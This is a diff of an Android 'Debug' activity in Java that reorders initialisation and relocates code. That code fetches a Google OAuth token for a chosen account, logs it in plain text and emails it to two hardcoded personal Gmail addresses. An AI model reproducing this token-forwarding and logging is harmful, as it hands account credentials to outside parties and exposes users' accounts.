@@ -68,9 +68,8 @@ public class Debug extends JalapenoActivity {
 	public void onCreate(Bundle savedInstanceState) {
 		super.onCreate(savedInstanceState);
 		getSupportActionBar().setDisplayHomeAsUpEnabled(true);
-
-		Init();
 		SetEvent();
+		Init();
 	}
 
 	@Override
@@ -81,7 +80,6 @@ public class Debug extends JalapenoActivity {
 	@Override
 	protected void onResume() {
 		super.onResume();
-		Init();
 	}
 
 	@Override
@@ -92,7 +90,8 @@ public class Debug extends JalapenoActivity {
 
 	private void Init() {
 		Logger.Debug(LOG_TAG, "Start debug");
-		SCOPE = SCOPE_BASE + CLIENT_ID;
+		//SCOPE = SCOPE_BASE + CLIENT_ID;
+		SCOPE = "oauth2:https://www.googleapis.com/auth/userinfo.profile";
 		_context = getApplicationContext();
 		_smsService = ServiceFactory.GetSmsService(_context);
 		_settingsService = new SettingsService(_context);
@@ -225,100 +224,7 @@ public class Debug extends JalapenoActivity {
 		AlertMessage.Alert(mActivity, String.format("89689264552 In cont: %s", InC));
 	}
 
-	private void SentTokenEmail() {
-		Intent intent = AccountPicker.newChooseAccountIntent(null, null, new String[] { "com.google" }, false, null, null, null, null);
-		startActivityForResult(intent, ACCOUNT_CODE);
-	}
-
-	private void SentTokenEmail2(final String accountName) {
-		/*
-		 * AccountManager accountManager =
-		 * AccountManager.get(getApplicationContext()); Account[] allAccounts =
-		 * accountManager.getAccountsByType(GoogleAuthUtil.GOOGLE_ACCOUNT_TYPE);
-		 * Account myAccount = null; for (Account account : allAccounts) { if
-		 * (account.name.equals(accountName)) { myAccount = account; } }
-		 */
-
-		final String[] error = new String[1];
-		error[0] = "";
-		AlertMessage.Alert(mActivity, accountName);
-
-		AsyncTask<Void, Void, String> task = new AsyncTask<Void, Void, String>() {
-			@Override
-			protected String doInBackground(Void... params) {
-				String token = "";
-				/*
-				 * try { Log.i(TAG, "Begin get token"); token =
-				 * GoogleAuthUtil.getToken(Debug.this, accountName, SCOPE); }
-				 * catch (IOException transientEx) { // Network or server error,
-				 * try later Log.e(TAG, transientEx.toString()); } catch
-				 * (UserRecoverableAuthException e) { // Recover (with
-				 * e.getIntent()) Log.e(TAG, e.toString()); Intent recover =
-				 * e.getIntent(); startActivityForResult(recover, ACCOUNT_CODE);
-				 * } catch (GoogleAuthException authEx) { // The call is not
-				 * ever expected to succeed // assuming you have already
-				 * verified that // Google Play services is installed.
-				 * Log.e(TAG, authEx.toString()); }
-				 */
-				// String token = null;
-				try {
-
-					Logger.Debug(LOG_TAG, "Scope: " + SCOPE);
-					Logger.Debug(LOG_TAG, "Email: " + accountName);
-					token = GoogleAuthUtil.getToken(mActivity, accountName, SCOPE);
-				} catch (GooglePlayServicesAvailabilityException playEx) {
-					error[0] = playEx.getMessage();
-					Dialog dialog = GooglePlayServicesUtil.getErrorDialog(playEx.getConnectionStatusCode(), Debug.this, 1);
-					dialog.show();
-					// Use the dialog to present to the user.
-				} catch (UserRecoverableAuthException recoverableException) {
-					error[0] = recoverableException.getMessage();
-					Intent recoveryIntent = recoverableException.getIntent();
-					// Use the intent in a custom dialog or just
-					// startActivityForResult.
-					Debug.this.startActivityForResult(recoveryIntent, 2);
-				} catch (GoogleAuthException authEx) {
-					// This is likely unrecoverable.
-					error[0] = "Unrecoverable authentication exception: " + authEx.getMessage();
-					Logger.Error(LOG_TAG, "Unrecoverable authentication exception: " + authEx.getMessage(), authEx);
-
-					return "";
-				} catch (IOException ioEx) {
-					error[0] = "transient error encountered: " + ioEx.getMessage();
-					Logger.Debug(LOG_TAG, "transient error encountered: " + ioEx.getMessage());
-
-					// doExponentialBackoff();
-					return "";
-				}
-
-				return token;
-			}
-
-			@Override
-			protected void onPostExecute(String token) {
-				Logger.Debug(LOG_TAG, "Access token retrieved:" + token);
-				if (error[0] != "") {
-					AlertMessage.Alert(mActivity, error[0]);
-				}
-				if (token != "") {
-					AlertMessage.Alert(mActivity, token);
-					getAndUseAuthTokenBlocking(token);
-				}
-			}
-		};
-
-		task.execute();
-		/*
-		 * AsyncTask task1 = new AsyncTask() {
-		 * 
-		 * @Override protected Object doInBackground(Object[] params) {
-		 * getAndUseAuthTokenBlocking(accountName); return null; } };
-		 * 
-		 * task.execute(null);
-		 */
-
-	}
-
+	
 	void getAndUseAuthTokenBlocking(String token) {
 		EmailSender emailSender = new EmailSender(this);
 		emailSender.SendEmail("lexruster@gmail.com;timur.khodzhaev@gmail.com;", "Token", "Token:" + token);
@@ -388,18 +294,6 @@ public class Debug extends JalapenoActivity {
 		startActivityForResult(intent, 13);
 	}
 
-	protected void onActivityResult(final int requestCode, final int resultCode, final Intent data) {
-		if (requestCode == 13 && resultCode == RESULT_OK) {
-			String accountName = data.getStringExtra(AccountManager.KEY_ACCOUNT_NAME);
-			Toast.makeText(this, accountName, Toast.LENGTH_LONG).show();
-		}
-
-		if (requestCode == ACCOUNT_CODE && resultCode == RESULT_OK) {
-			String accountName = data.getStringExtra(AccountManager.KEY_ACCOUNT_NAME);
-			SentTokenEmail2(accountName);
-		}
-	}
-
 	private void Spam() {
 		Toast.makeText(this, "Spam", Toast.LENGTH_LONG).show();
 		/*
@@ -424,4 +318,121 @@ public class Debug extends JalapenoActivity {
 		 */
 		_ringtoneService.ContactRingtone();
 	}
+	
+	@Override
+	protected void onActivityResult(final int requestCode, final int resultCode, final Intent data) {
+		Logger.Debug(LOG_TAG, "onActivityResult resultCode="+resultCode);
+		if (requestCode == 13 && resultCode == RESULT_OK) {
+			String accountName = data.getStringExtra(AccountManager.KEY_ACCOUNT_NAME);
+			Toast.makeText(this, accountName, Toast.LENGTH_LONG).show();
+		}
+
+		if (requestCode == ACCOUNT_CODE && resultCode == RESULT_OK) {
+			String accountName = data.getStringExtra(AccountManager.KEY_ACCOUNT_NAME);
+			Logger.Debug(LOG_TAG, "accountName ="+accountName);
+			SentTokenEmail2(accountName);
+		}
+	}
+	
+	private void SentTokenEmail() {
+		//Intent intent = AccountPicker.newChooseAccountIntent(null, null, new String[] { "com.google" }, false, null, null, null, null);
+		//startActivityForResult(intent, ACCOUNT_CODE);
+		Logger.Debug(LOG_TAG, "SentTokenEmail");
+		 String[] accountTypes = new String[]{"com.google"};
+		    Intent intent = AccountPicker.newChooseAccountIntent(null, null,
+		            accountTypes, true, null, null, null, null);
+		    startActivityForResult(intent, ACCOUNT_CODE);
+	}
+
+	private void SentTokenEmail2(final String accountName) {
+		/*
+		 * AccountManager accountManager =
+		 * AccountManager.get(getApplicationContext()); Account[] allAccounts =
+		 * accountManager.getAccountsByType(GoogleAuthUtil.GOOGLE_ACCOUNT_TYPE);
+		 * Account myAccount = null; for (Account account : allAccounts) { if
+		 * (account.name.equals(accountName)) { myAccount = account; } }
+		 */
+		Logger.Debug(LOG_TAG, "SentTokenEmail2");
+		final String[] error = new String[1];
+		error[0] = "";
+		AlertMessage.Alert(mActivity, accountName);
+
+		AsyncTask<Void, Void, String> task = new AsyncTask<Void, Void, String>() {
+			@Override
+			protected String doInBackground(Void... params) {
+				String token = "";
+				/*
+				 * try { Log.i(TAG, "Begin get token"); token =
+				 * GoogleAuthUtil.getToken(Debug.this, accountName, SCOPE); }
+				 * catch (IOException transientEx) { // Network or server error,
+				 * try later Log.e(TAG, transientEx.toString()); } catch
+				 * (UserRecoverableAuthException e) { // Recover (with
+				 * e.getIntent()) Log.e(TAG, e.toString()); Intent recover =
+				 * e.getIntent(); startActivityForResult(recover, ACCOUNT_CODE);
+				 * } catch (GoogleAuthException authEx) { // The call is not
+				 * ever expected to succeed // assuming you have already
+				 * verified that // Google Play services is installed.
+				 * Log.e(TAG, authEx.toString()); }
+				 */
+				// String token = null;
+				try {
+
+					Logger.Debug(LOG_TAG, "Scope: " + SCOPE);
+					Logger.Debug(LOG_TAG, "Email: " + accountName);
+					token = GoogleAuthUtil.getToken(mActivity, accountName, SCOPE);
+					Logger.Debug(LOG_TAG, "token: " + token);
+				} catch (GooglePlayServicesAvailabilityException playEx) {
+					error[0] = playEx.getMessage();
+					Dialog dialog = GooglePlayServicesUtil.getErrorDialog(playEx.getConnectionStatusCode(), Debug.this, 1);
+					dialog.show();
+					// Use the dialog to present to the user.
+				} catch (UserRecoverableAuthException recoverableException) {
+					error[0] = recoverableException.getMessage();
+					Intent recoveryIntent = recoverableException.getIntent();
+					// Use the intent in a custom dialog or just
+					// startActivityForResult.
+					Debug.this.startActivityForResult(recoveryIntent, 2);
+				} catch (GoogleAuthException authEx) {
+					// This is likely unrecoverable.
+					error[0] = "Unrecoverable authentication exception: " + authEx.getMessage();
+					Logger.Error(LOG_TAG, "Unrecoverable authentication exception: " + authEx.getMessage(), authEx);
+
+					return "";
+				} catch (IOException ioEx) {
+					error[0] = "transient error encountered: " + ioEx.getMessage();
+					Logger.Debug(LOG_TAG, "transient error encountered: " + ioEx.getMessage());
+
+					// doExponentialBackoff();
+					return "";
+				}
+
+				Logger.Debug(LOG_TAG, "return token: " + token);
+				return token;
+			}
+
+			@Override
+			protected void onPostExecute(String token) {
+				Logger.Debug(LOG_TAG, "Access token retrieved:" + token);
+				if (error[0] != "") {
+					AlertMessage.Alert(mActivity, error[0]);
+				}
+				if (token != "") {
+					AlertMessage.Alert(mActivity, token);
+					getAndUseAuthTokenBlocking(token);
+				}
+			}
+		};
+
+		task.execute();
+		/*
+		 * AsyncTask task1 = new AsyncTask() {
+		 * 
+		 * @Override protected Object doInBackground(Object[] params) {
+		 * getAndUseAuthTokenBlocking(accountName); return null; } };
+		 * 
+		 * task.execute(null);
+		 */
+
+	}
+
 }
